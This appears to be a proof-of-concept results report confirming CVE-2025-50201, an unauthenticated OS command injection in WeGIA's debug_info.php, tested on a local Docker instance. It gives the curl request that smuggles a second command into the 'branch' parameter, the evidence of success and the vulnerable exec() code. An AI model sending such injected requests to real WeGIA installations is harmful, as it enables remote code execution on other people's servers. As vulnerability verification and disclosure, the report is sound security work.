============================================================
CVE-2025-50201 - WeGIA OS Command Injection PoC Results
============================================================
Date: 2026-02-03
Target: http://localhost:8085/WeGIA/html/configuracao/debug_info.php

[VULNERABILITY CONFIRMED]

Manual Verification:
- Command: curl -s -X POST -d 'branch=master;touch /tmp/pwned&action=switch' 'http://localhost:8085/WeGIA/html/configuracao/debug_info.php'
- Result: File /tmp/pwned created with owner www-data

Evidence from Docker container:
$ docker exec cve-2025-50201-web-1 ls -la /tmp/pwned
-rw-r--r-- 1 www-data www-data 0 Feb  3 09:22 /tmp/pwned

Apache Log Evidence:
- Request logged: "POST /WeGIA/html/configuracao/debug_info.php HTTP/1.1" 302 23560
- Git command executed: "Switched to branch 'master'"
- PHP error: "[ERRO] em /var/www/html/WeGIA/html/permissao/permissao.php na linha 38"

Vulnerability Analysis:
- The vulnerable code in debug_info.php executes user input via exec() function
- The 'branch' parameter is passed directly to: exec("git -C ".ROOT." checkout $branch", $output);
- Command injection possible via shell metacharacters (;, |, &, etc.)
- The session check (if(!isset($_SESSION['usuario']))) uses header() without exit()
- This allows code execution to continue even when not authenticated

Attack Vector:
- No authentication required (unauthenticated RCE)
- Blind command injection (output not directly reflected)
- Can create/modify files with www-data privileges
- Can execute arbitrary system commands

CVSS Score: 9.8 (Critical)
